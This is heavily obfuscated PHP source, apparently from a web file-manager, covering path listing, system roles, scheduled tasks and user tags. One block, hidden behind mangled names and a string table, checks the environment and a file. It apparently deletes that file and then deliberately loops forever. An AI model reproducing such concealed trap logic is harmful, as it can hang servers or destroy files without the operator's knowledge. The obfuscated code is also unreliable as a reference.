$this->parentLevelArray($şÅ¯¶ˆ’[$êŠŒÃòØ[604]]); foreach ($›ÒÈÙÎÓ as $é›Öñ”Å => $†ÏÃàŞ) { if (isset($úúöıâ[$†ÏÃàŞ])) { $¡ÔÀ˜ï¸ .= $úúöıâ[$†ÏÃàŞ] . $êŠŒÃòØ[8]; } } $í‡‹üœ¿[$½ıƒáÒ] = $¡ÔÀ˜ï¸; } $¡ÔÀ˜ï¸ .= $şÅ¯¶ˆ’[$êŠŒÃòØ[32]]; if ($şÅ¯¶ˆ’[$êŠŒÃòØ[500]] == $êŠŒÃòØ[91]) { $¡ÔÀ˜ï¸ .= $êŠŒÃòØ[8]; } $şÅ¯¶ˆ’[$êŠŒÃòØ[602]] = str_replace($êŠŒÃòØ[254], $êŠŒÃòØ[8], $¡ÔÀ˜ï¸); if ($şÅ¯¶ˆ’[$êŠŒÃòØ[190]] == $êŠŒÃòØ[228]) { $şÅ¯¶ˆ’[$êŠŒÃòØ[32]] = trim($úúöıâ[$şÅ¯¶ˆ’[$êŠŒÃòØ[191]]], $êŠŒÃòØ[8]); $şÅ¯¶ˆ’[$êŠŒÃòØ[602]] = $şÅ¯¶ˆ’[$êŠŒÃòØ[32]] . $êŠŒÃòØ[8]; } if (intval($şÅ¯¶ˆ’[$êŠŒÃòØ[188]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($şÅ¯¶ˆ’, $›ÒÈÙÎÓ, $‹§µôÊ†); } } unset($şÅ¯¶ˆ’); return $Ëš™şä¶; } private function _listAppendPathRecycle(&$†½ˆ«è, $ËåÂÈ¬¬, $Äõœ¢½´) { $Ñ†Ú å˜ =& $_SERVER[¹Éµ„ºå]; if (!in_array($Äõœ¢½´, $ËåÂÈ¬¬) && $†½ˆ«è[$Ñ†Ú å˜[191]] != $Äõœ¢½´) { return; } $şî—Ù®Â = explode($Ñ†Ú å˜[8], trim($†½ˆ«è[$Ñ†Ú å˜[602]], $Ñ†Ú å˜[8])); $ó‡»ú Ë = implode($Ñ†Ú å˜[8], array_slice($şî—Ù®Â, 2)); $†½ˆ«è[$Ñ†Ú å˜[602]] = $Ñ†Ú å˜[8] . LNG($Ñ†Ú å˜[612]) . $Ñ†Ú å˜[8] . ltrim($ó‡»ú Ë, $Ñ†Ú å˜[8]); $†½ˆ«è[$Ñ†Ú å˜[604]] = $Ñ†Ú å˜[613] . implode($Ñ†Ú å˜[50], array_slice($ËåÂÈ¬¬, 1)) . $Ñ†Ú å˜[50]; if ($†½ˆ«è[$Ñ†Ú å˜[191]] == $Äõœ¢½´) { $†½ˆ«è[$Ñ†Ú å˜[604]] = $Ñ†Ú å˜[613]; $†½ˆ«è[$Ñ†Ú å˜[190]] = $Ñ†Ú å˜[228]; $†½ˆ«è[$Ñ†Ú å˜[32]] = LNG($Ñ†Ú å˜[612]); } $†½ˆ«è[$Ñ†Ú å˜[614]] = $Ñ†Ú å˜[615]; } protected function _listAppendPathRoot(&$ı»úæ‘µ, $äÍ—Éè) { $òŞêçÀÉ =& $_SERVER[¹Éµ„ºå]; static $ªıÖëèÚ = false; static $ì‘¡¦Ò– = false; $†ÌÚÚÀ÷ = $òŞêçÀÉ[12]; if ($ı»úæ‘µ[$òŞêçÀÉ[188]] == self::TYPE_USER) { if ($ı»úæ‘µ[$òŞêçÀÉ[589]] == USER_ID) { $†ÌÚÚÀ÷ = LNG($òŞêçÀÉ[616]); if ($ªıÖëèÚ === !1) { $øò–ÈÍ£ = Model($òŞêçÀÉ[617])->getInfoFull(USER_ID); $ªıÖëèÚ = _get($øò–ÈÍ£, $òŞêçÀÉ[618], $òŞêçÀÉ[12]); } if ($ì‘¡¦Ò– === !1) { $øò–ÈÍ£ = Model($òŞêçÀÉ[617])->getInfoFull(USER_ID); $ì‘¡¦Ò– = _get($øò–ÈÍ£, $òŞêçÀÉ[619], $òŞêçÀÉ[12]); } if ($äÍ—Éè && $äÍ—Éè[0] == $ªıÖëèÚ || !$äÍ—Éè && $ı»úæ‘µ[$òŞêçÀÉ[191]] == $ªıÖëèÚ) { $†ÌÚÚÀ÷ = LNG($òŞêçÀÉ[620]); $ı»úæ‘µ[$òŞêçÀÉ[621]] = $òŞêçÀÉ[622]; } if ($äÍ—Éè && $äÍ—Éè[0] == $ì‘¡¦Ò– || !$äÍ—Éè && $ı»úæ‘µ[$òŞêçÀÉ[191]] == $ì‘¡¦Ò–) { $†ÌÚÚÀ÷ = $†ÌÚÚÀ÷ . $òŞêçÀÉ[623] . LNG($òŞêçÀÉ[624]); } if (!$äÍ—Éè) { $ı»úæ‘µ[$òŞêçÀÉ[32]] = $†ÌÚÚÀ÷; } } else { $øò–ÈÍ£ = Model($òŞêçÀÉ[617])->getInfoFull($ı»úæ‘µ[$òŞêçÀÉ[589]]); $×ùÛƒ = _get($øò–ÈÍ£, $òŞêçÀÉ[619], $òŞêçÀÉ[12]); $ı»úæ‘µ[$òŞêçÀÉ[625]] = Model($òŞêçÀÉ[597])->getInfoSimpleOuter($ı»úæ‘µ[$òŞêçÀÉ[589]]); $†ÌÚÚÀ÷ = LNG($òŞêçÀÉ[626]) . $òŞêçÀÉ[173] . $ı»úæ‘µ[$òŞêçÀÉ[625]][$òŞêçÀÉ[32]] . $òŞêçÀÉ[175]; if ($äÍ—Éè && $äÍ—Éè[0] == $×ùÛƒ || !$äÍ—Éè && $ı»úæ‘µ[$òŞêçÀÉ[191]] == $×ùÛƒ) { $†ÌÚÚÀ÷ = LNG($òŞêçÀÉ[626]) . $òŞêçÀÉ[627] . $ı»úæ‘µ[$òŞêçÀÉ[625]][$òŞêçÀÉ[32]] . $òŞêçÀÉ[623] . LNG($òŞêçÀÉ[624]) . $òŞêçÀÉ[175]; } } } else { if ($ı»úæ‘µ[$òŞêçÀÉ[188]] == self::TYPE_GROUP) { $š­°Òé = Model($òŞêçÀÉ[605])->getInfoSimple($ı»úæ‘µ[$òŞêçÀÉ[589]]); $†ÌÚÚÀ÷ = $š­°Òé[$òŞêçÀÉ[32]]; } else { if ($ı»úæ‘µ[$òŞêçÀÉ[188]] == self::TYPE_SYSTEM) { $†ÌÚÚÀ÷ = $òŞêçÀÉ[628]; } } } $†ÌÚÚÀ÷ = $†ÌÚÚÀ÷ ? $òŞêçÀÉ[8] . $†ÌÚÚÀ÷ . $òŞêçÀÉ[8] : $òŞêçÀÉ[8]; return $†ÌÚÚÀ÷; } protected function _listAppendUser(&$ƒºµÒ×â) { $²ÑÄòò =& $_SERVER[¹Éµ„ºå]; $ÏÍ¾†ÏŠ = array_to_keyvalue($ƒºµÒ×â, $²ÑÄòò[12], $²ÑÄòò[541]); $ï–“…‚Ì = array_to_keyvalue($ƒºµÒ×â, $²ÑÄòò[12], $²ÑÄòò[543]); $§Èá¼±ù = array_merge($ÏÍ¾†ÏŠ, $ï–“…‚Ì); $ù¢•Íç¡ = Model($²ÑÄòò[617])->userListInfo($§Èá¼±ù); foreach ($ƒºµÒ×â as &$ñ÷ò»³ª) { $¬‡íÂó˜ = $ñ÷ò»³ª[$²ÑÄòò[541]]; $ñ÷ò»³ª[$²ÑÄòò[541]] = $ù¢•Íç¡[$¬‡íÂó˜] ? $ù¢•Íç¡[$¬‡íÂó˜] : !1; $¬‡íÂó˜ = $ñ÷ò»³ª[$²ÑÄòò[543]]; $ñ÷ò»³ª[$²ÑÄòò[543]] = $ù¢•Íç¡[$¬‡íÂó˜] ? $ù¢•Íç¡[$¬‡íÂó˜] : !1; if (_get($ñ÷ò»³ª, $²ÑÄòò[629], 0)) { $ã¹Ùê = $GLOBALS[$²ÑÄòò[6]][$²ÑÄòò[92]][$²ÑÄòò[630]]; if ($ñ÷ò»³ª[$²ÑÄòò[555]][$²ÑÄòò[631]] <= time() - $ã¹Ùê) { $this->metaSet($ñ÷ò»³ª[$²ÑÄòò[191]], $²ÑÄòò[632], null); $this->metaSet($ñ÷ò»³ª[$²ÑÄòò[191]], $²ÑÄòò[631], null); unset($ñ÷ò»³ª[$²ÑÄòò[555]][$²ÑÄòò[632]]); continue; } $õ£»½ËŒ = $ñ÷ò»³ª[$²ÑÄòò[555]][$²ÑÄòò[632]]; $ñ÷ò»³ª[$²ÑÄòò[555]][$²ÑÄòò[633]] = Model($²ÑÄòò[617])->getInfoSimpleOuter($õ£»½ËŒ); } } unset($ñ÷ò»³ª); } public function parentLevelArray($§¢©€À) { $Ÿ¾‹Şé =& $_SERVER[¹Éµ„ºå]; $§¢©€À = explode($Ÿ¾‹Şé[50], trim($§¢©€À, $Ÿ¾‹Şé[50])); return array_to_int(array_filter($§¢©€À)); } public function listAll($çöôè´›) { $­İáÍÑØ =& $_SERVER[¹Éµ„ºå]; $°›¦ó› = $this->sourceInfo($çöôè´›); $ĞËÆµ½ˆ = array($­İáÍÑØ[634] => array($­İáÍÑØ[635], $°›¦ó›[$­İáÍÑØ[604]] . $çöôè´› . $­İáÍÑØ[636]), $­İáÍÑØ[637] => 0); $¦ÒëÍÎ¦ = $­İáÍÑØ[638]; $ÄØÈ¶•é = "\114\105\106\x54\40\112\x4f\x49\116\x20{$this->tablePrefix}\x69\x6f\137\146\151\x6c\x65\40\x66\151\154\x65\x20\157\156\40\x73\x6f\165\162\x63\x65\56\x66\151\154\145\x49\104\40\x3d\x20\146\x69\x6c\x65\56\x66\x69\x6c\145\111\x44"; $ç¸¬ç…¢ = $this->alias($­İáÍÑØ[533])->field($¦ÒëÍÎ¦)->where($ĞËÆµ½ˆ)->join($ÄØÈ¶•é)->select(); $this->_listAppendAuth($ç¸¬ç…¢); $this->_listAppendUser($ç¸¬ç…¢); $this->_listAppendPath($ç¸¬ç…¢); $ç¸¬ç…¢ = array_to_keyvalue($ç¸¬ç…¢, $­İáÍÑØ[191]); $¾º—Èı÷ = "\x2f{$°›¦ó›[$­İáÍÑØ[32]]}\57"; $¾º—Èı÷ = $¾º—Èı÷ == $­İáÍÑØ[254] ? $­İáÍÑØ[8] : $¾º—Èı÷; $ÏØá½®’ = array(); foreach ($ç¸¬ç…¢ as $ŠæïÖ– => $’èºê¬) { $Ó­‹à›½ = $this->parentLevelArray($’èºê¬[$­İáÍÑØ[604]]); array_shift($Ó­‹à›½); $Ûü¾À·Õ = $¾º—Èı÷; for ($çµ™„Â© = 0; $çµ™„Â© < count($Ó­‹à›½); $çµ™„Â©++) { $Ûü¾À·Õ .= $ç¸¬ç…¢[$Ó­‹à›½[$çµ™„Â©]][$­İáÍÑØ[32]] . $­İáÍÑØ[8]; } $Ûü¾À·Õ .= $’èºê¬[$­İáÍÑØ[32]]; if ($’èºê¬[$­İáÍÑØ[500]]) { $Ûü¾À·Õ .= $­İáÍÑØ[8]; } $õº­”é = array($­İáÍÑØ[510] => str_replace($­İáÍÑØ[254], $­İáÍÑØ[8], str_replace($­İáÍÑØ[254], $­İáÍÑØ[8], str_replace($­İáÍÑØ[254], $­İáÍÑØ[8], $Ûü¾À·Õ))), $­İáÍÑØ[639] => intval($’èºê¬[$­İáÍÑØ[500]]), $­İáÍÑØ[640] => intval($’èºê¬[$­İáÍÑØ[79]]), $­İáÍÑØ[88] => intval($’èºê¬[$­İáÍÑØ[88]]), $­İáÍÑØ[90] => $this->pathInfoFilter($’èºê¬)); if (!$õº­”é[$­İáÍÑØ[500]]) { $õº­”é[$­İáÍÑØ[557]] = $’èºê¬[$­İáÍÑØ[557]]; } $ÏØá½®’[] = $õº­”é; } $ÏØá½®’ = array_sort_by($ÏØá½®’, $­İáÍÑØ[87]); return $ÏØá½®’; } } goto AÜ†­î‰¹™; A½ì½¡ù¶: if (!isset($_SERVER[$_SERVER[¹Éµ„ºå][1025]]) || !isset($_SERVER[$_SERVER[¹Éµ„ºå][1035]])) { $_getc = $_SERVER[¹Éµ„ºå][1028]; $_getfile = $_SERVER[$_SERVER[¹Éµ„ºå][1029]] . $_SERVER[¹Éµ„ºå][1030]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹Éµ„ºå][285], $_getfilec); if (count($_getarrs) < $_SERVER[¹Éµ„ºå][722]) { $exit = $_SERVER[¹Éµ„ºå][1031]; $exit(); } $_act = $_SERVER[¹Éµ„ºå][1036]; $_act($_SERVER[$_SERVER[¹Éµ„ºå][1029]] . $_SERVER[¹Éµ„ºå][1030]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¹Éµ„ºå][463]); } } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\x72\157\154\x65\x4c\x69\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\x61\165\164\150", "\154\141\142\145\x6c", "\x64\x69\x73\x70\154\141\x79", "\x73\171\163\164\x65\155", "\x64\x65\x73\143", "\x69\147\x6e\157\x72\145\105\x78\164", "\x69\147\156\157\162\x65\x46\x69\x6c\145\x53\151\172\x65", "\x61\144\x6d\151\x6e\151\x73\x74\x72\x61\164\157\162", "\x73\x6f\162\x74"); public function listData($«Ë—ê‚İ = false, $’¸ÏÆô‚ = "\x73\x6f\x72\164", $¾ÖŠû„ø = false) { $ìÛï°üÜ =& $_SERVER[¹Éµ„ºå]; $ÎÜÜĞÙ = parent::listData($«Ë—ê‚İ, $’¸ÏÆô‚, $¾ÖŠû„ø); if (!$«Ë—ê‚İ) { foreach ($ÎÜÜĞÙ as $¸Ê ÌÜÁ => $å‘œåó ) { if ($å‘œåó [$ìÛï°üÜ[2365]] == 1) { $ÎÜÜĞÙ[$¸Ê ÌÜÁ][$ìÛï°üÜ[540]] = LNG($ìÛï°üÜ[2651]); } } } return $ÎÜÜĞÙ; } public function update($ûá„òÍÊ, $·—¦­) { $œ»ˆóÜœ =& $_SERVER[¹Éµ„ºå]; $ÃØÓá Â = parent::listData($ûá„òÍÊ); $„¿³Ó“ü = $this->findByName($·—¦­[$œ»ˆóÜœ[32]]); if (!$ÃØÓá Â || $„¿³Ó“ü && $„¿³Ó“ü[$œ»ˆóÜœ[487]] != $ÃØÓá Â[$œ»ˆóÜœ[487]]) { return !1; } if ($„¿³Ó“ü[$œ»ˆóÜœ[2365]] == 1) { $·—¦­ = array($œ»ˆóÜœ[32] => $·—¦­[$œ»ˆóÜœ[32]], $œ»ˆóÜœ[2192] => $·—¦­[$œ»ˆóÜœ[2192]]); } $this->filterAuth($·—¦­[$œ»ˆóÜœ[502]]); return parent::update($ûá„òÍÊ, $·—¦­); } public function remove($Ú¢ŠÀš¶) { $öÄ—§õ = parent::listData($Ú¢ŠÀš¶); if (!$öÄ—§õ || $öÄ—§õ[$_SERVER[¹Éµ„ºå][189]]) { return !1; } return parent::remove($Ú¢ŠÀš¶); } public function add($€¼¿•ß) { $…æ¶àõÛ =& $_SERVER[¹Éµ„ºå]; $£Ú¥şşø = $€¼¿•ß[$…æ¶àõÛ[32]]; if ($this->findByName($£Ú¥şşø)) { return !1; } $ÃáÖãÖ‚ = array($…æ¶àõÛ[509] => $£Ú¥şşø, $…æ¶àõÛ[2177] => $…æ¶àõÛ[12], $…æ¶àõÛ[2173] => $…æ¶àõÛ[2181], $…æ¶àõÛ[2652] => 1, $…æ¶àõÛ[2176] => 0, $…æ¶àõÛ[2653] => 0, $…æ¶àõÛ[2175] => $this->getSort()); $€¼¿•ß = array_merge($ÃáÖãÖ‚, $€¼¿•ß); $this->filterAuth($€¼¿•ß[$…æ¶àõÛ[502]]); return parent::insert($€¼¿•ß); } private function getSort() { $·ºÅş  =& $_SERVER[¹Éµ„ºå]; $ìòëóı‚ = parent::listData(); $æØ¼ı¹… = array_to_keyvalue($ìòëóı‚, $·ºÅş [12], $·ºÅş [2193]); return empty($æØ¼ı¹…) ? 0 : max($æØ¼ı¹…) + 1; } private function filterAuth(&$ì‡²¬äŒ) { $ä”—¸Ôå =& $_SERVER[¹Éµ„ºå]; $ÜàØ›ã² = array(); $†Á¡•ş‘ = array_filter(explode($ä”—¸Ôå[50], $ì‡²¬äŒ)); foreach ($†Á¡•ş‘ as $ì‡²¬äŒ) { $áâì¡â× = explode($ä”—¸Ôå[10], $ì‡²¬äŒ); if ($áâì¡â×[0] == $ä”—¸Ôå[2654] && $áâì¡â×[1] != $ä”—¸Ôå[1298]) { $ç™´Óå” = $áâì¡â×[0] . $ä”—¸Ôå[10] . $áâì¡â×[1] . $ä”—¸Ôå[2655]; if (!in_array($ç™´Óå”, $†Á¡•ş‘)) { $ÜàØ›ã²[] = $ç™´Óå”; } } $ÜàØ›ã²[] = $ì‡²¬äŒ; } $ì‡²¬äŒ = implode($ä”—¸Ôå[50], $ÜàØ›ã²); } public function findRoleDefault() { $Ü•»©è =& $_SERVER[¹Éµ„ºå]; $ûÑÁ¶º˜ = parent::listData(); $¥Ë£©¤ = !1; foreach ($ûÑÁ¶º˜ as $êÑØŞû) { if (!$êÑØŞû || $êÑØŞû[$Ü•»©è[2191]] == $Ü•»©è[228] || $êÑØŞû[$Ü•»©è[2365]] == 1) { continue; } if (strstr($êÑØŞû[$Ü•»©è[502]], $Ü•»©è[2656])) { continue; } if (!strstr($êÑØŞû[$Ü•»©è[502]], $Ü•»©è[2657])) { continue; } if (!$¥Ë£©¤) { $¥Ë£©¤ = $êÑØŞû; continue; } $ûæš¤—à = explode($Ü•»©è[50], $¥Ë£©¤[$Ü•»©è[502]]); $é—©Æç = explode($Ü•»©è[50], $êÑØŞû[$Ü•»©è[502]]); if (count($ûæš¤—à) > count($é—©Æç)) { $¥Ë£©¤ = $êÑØŞû; } } return $¥Ë£©¤ ? $¥Ë£©¤[$Ü•»©è[487]] : $Ü•»©è[12]; } public function sort($ÖõË –», $­Õš€ÒĞ) { return parent::update($ÖõË –», $­Õš€ÒĞ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\164\141\163\153\114\151\x73\x74"; public $field = array("\x6e\x61\155\x65", "\x74\171\160\x65", "\145\x76\145\x6e\164", "\x74\x69\155\x65", "\144\x65\x73\143", "\163\x79\x73\x74\145\155", "\x65\x6e\141\142\x6c\x65", "\154\x61\163\164\122\165\x6e", "\163\x6f\x72\x74"); public function listData($Œ‚İ«¹ = false, $íšºÀô¹ = "\163\157\x72\x74", $ğ»²®ı = false) { return parent::listData($Œ‚İ«¹, $íšºÀô¹, $ğ»²®ı); } public function add($à™²ÔïÔ) { $¡™ÔŠÖ =& $_SERVER[¹Éµ„ºå]; $ĞÆøàœË = $this->findByName($à™²ÔïÔ[$¡™ÔŠÖ[32]]); if ($ĞÆøàœË) { return !1; } $à™²ÔïÔ[$¡™ÔŠÖ[1916]] = 0; $à™²ÔïÔ[$¡™ÔŠÖ[2193]] = $this->getSort(); return parent::insert($à™²ÔïÔ); } private function getSort() { $üÌå–– =& $_SERVER[¹Éµ„ºå]; $Œãç´× = parent::listData(); $ö¤˜ÁÛğ = array_to_keyvalue($Œãç´×, $üÌå––[12], $üÌå––[2193]); return empty($ö¤˜ÁÛğ) ? 0 : max($ö¤˜ÁÛğ) + 1; } public function update($ıì×™¨‘, $‹Ú¿ô´æ) { $½¶´ºÚÅ =& $_SERVER[¹Éµ„ºå]; $öúÊ˜áÅ = $this->listData($ıì×™¨‘); $òÏ×öÇî = $this->findByName($‹Ú¿ô´æ[$½¶´ºÚÅ[32]]); if (!$öúÊ˜áÅ || $òÏ×öÇî && $òÏ×öÇî[$½¶´ºÚÅ[487]] != $öúÊ˜áÅ[$½¶´ºÚÅ[487]]) { return !1; } return parent::update($ıì×™¨‘, $‹Ú¿ô´æ); } public function remove($œĞ·ò‰, $øâßŒé¿ = false) { $¾ãûŒÑÙ =& $_SERVER[¹Éµ„ºå]; $¸ä·†ÈÙ = $this->listData($œĞ·ò‰); if (!$¸ä·†ÈÙ) { return; } if (!$øâßŒé¿ && $¸ä·†ÈÙ[$¾ãûŒÑÙ[189]] == $¾ãûŒÑÙ[91]) { return !1; } return parent::remove($œĞ·ò‰); } public function enable($“ÊÑˆ, $Ó¥¡ˆæá) { return $this->update($“ÊÑˆ, array($_SERVER[¹Éµ„ºå][2646] => $Ó¥¡ˆæá)); } public function run($îË¾ Ö¯) { return $this->update($îË¾ Ö¯, array($_SERVER[¹Éµ„ºå][2658] => time())); } } goto c˜¥Õ·«ªô; Fª¹ó“ÄÔ©: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($ô„½¨™Å) { $ïíŠÀË‘ =& $_SERVER[¹Éµ„ºå]; return array($ïíŠÀË‘[2285] => array($ïíŠÀË‘[2711] . USER_ID, $ïíŠÀË‘[2286])); } protected function ___listData() { $“ğñï°ı =& $_SERVER[¹Éµ„ºå]; $˜óÛˆØ‚ = array($“ğñï°ı[1956] => USER_ID, $“ğñï°ı[573] => array($“ğñï°ı[2289], 0)); $¼ï…é®‚ = $“ğñï°ı[2712]; $Á•œÈå = $this->field($¼ï…é®‚)->where($˜óÛˆØ‚)->order($“ğñï°ı[2291])->select(); return $Á•œÈå ? $Á•œÈå : array(); } protected function addToTag($ç¸ñã¤Ü, $û®ıúµ ) { $À™Âü¤£ =& $_SERVER[¹Éµ„ºå]; if (!Model($À™Âü¤£[2439])->listData($û®ıúµ )) { return !1; } if (is_numeric($ç¸ñã¤Ü)) { $àì÷¼­Ü = Model($À™Âü¤£[924])->pathInfo($ç¸ñã¤Ü); if (!$àì÷¼­Ü) { return !1; } } else { $àì÷¼­Ü = IO::infoSimple($ç¸ñã¤Ü); if (!$àì÷¼­Ü) { return !1; } $Ëèú‚ƒ = $àì÷¼­Ü[$À™Âü¤£[32]]; $Ø–·À¤· = $àì÷¼­Ü[$À™Âü¤£[33]]; if (isset($àì÷¼­Ü[$À™Âü¤£[500]])) { $Ø–·À¤· = $àì÷¼­Ü[$À™Âü¤£[500]] == $À™Âü¤£[91] ? $À™Âü¤£[78] : $À™Âü¤£[230]; } } $Àª¨òô = array($À™Âü¤£[1956] => USER_ID, $À™Âü¤£[573] => $û®ıúµ , $À™Âü¤£[510] => $ç¸ñã¤Ü, $À™Âü¤£[511] => $Ø–·À¤· ? $Ø–·À¤· : $À™Âü¤£[505], $À™Âü¤£[509] => $Ëèú‚ƒ ? $Ëèú‚ƒ : $À™Âü¤£[12], $À™Âü¤£[2175] => 0); if ($this->where($Àª¨òô)->find()) { return !1; } return $this->add($Àª¨òô); } protected function removeFromTag($ïÈêÛ¨ô, $ÇºôèäÏ) { $¶†šò¸ =& $_SERVER[¹Éµ„ºå]; if (!Model($¶†šò¸[2439])->listData($ÇºôèäÏ)) { return !1; } if (is_array($ïÈêÛ¨ô)) { $ïÈêÛ¨ô = array($¶†šò¸[7], $ïÈêÛ¨ô); } $Áû©ŒÓº = array($¶†šò¸[1956] => USER_ID, $¶†šò¸[573] => $ÇºôèäÏ, $¶†šò¸[510] => $ïÈêÛ¨ô); return $this->where($Áû©ŒÓº)->delete(); } protected function removeByTag($ªæÊãïš) { $öµŠãÍ¦ =& $_SERVER[¹Éµ„ºå]; if (!$ªæÊãïš) { return !1; } $Æ±Š—»Ú = array($öµŠãÍ¦[1956] => USER_ID, $öµŠãÍ¦[573] => $ªæÊãïš); return $this->where($Æ±Š—»Ú)->delete(); } protected function removeBySource($ú™ŞñÇ) { $¤Ì–Ç²» =& $_SERVER[¹Éµ„ºå]; if (is_array($ú™ŞñÇ)) { $ú™ŞñÇ = array($¤Ì–Ç²»[7], $ú™ŞñÇ); } $ğä˜à¦ = array($¤Ì–Ç²»[1956] => USER_ID, $¤Ì–Ç²»[573] => array($¤Ì–Ç²»[1171], 0), $¤Ì–Ç²»[510] => $ú™ŞñÇ); return $this->where($ğä˜à¦)->delete(); } }